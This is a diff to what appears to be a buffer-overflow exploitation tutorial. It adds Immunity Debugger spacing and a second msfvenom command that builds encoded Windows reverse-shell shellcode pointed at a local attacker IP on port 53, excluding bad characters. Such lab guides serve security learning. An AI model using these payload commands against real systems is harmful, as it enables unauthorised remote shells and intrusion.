@@ -62,6 +62,7 @@ On the target system we will be using a debugger to view and pause the execution
 
 ### IMMUNITY TIPS
 
+
 - If at all possible, run as Administrator
 
 - If target application is already running `File -> Attach`
@@ -297,6 +298,12 @@ Using msfvenom to create the shellcode (exluding "\x00\x0a\x0d" as badchars in t
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.92 LPORT=53 EXITFUNC=thread -b "\x00\x0a\x0d" -f c
 ```
+    
+may need to set encoding method
+
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.92 LPORT=53 EXITFUNC=thread –e x86/shikata_ga_nai -b "\x00\x0a\x0d" -f c    
+```    
 
 Then update the payload variable to create exploit.py (follow below format)
 
